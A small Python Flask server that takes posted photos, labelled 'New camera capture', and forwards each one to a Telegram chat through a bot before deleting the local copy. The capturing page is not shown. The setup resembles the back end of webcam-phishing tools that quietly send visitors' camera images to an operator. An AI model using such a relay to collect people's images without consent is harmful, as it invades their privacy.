from flask import Flask, render_template, request
import telebot
import os
from datetime import datetime

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    photo = request.files['photo']
    if photo:
        filename = datetime.now().strftime("%Y%m%d_%H%M%S") + ".jpg"
        filepath = os.path.join("/tmp", filename)
        photo.save(filepath)

        with open(filepath, 'rb') as img:
            bot.send_photo(CHAT_ID, img, caption="ߓ New camera capture")

        os.remove(filepath)
    return "Uploaded"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
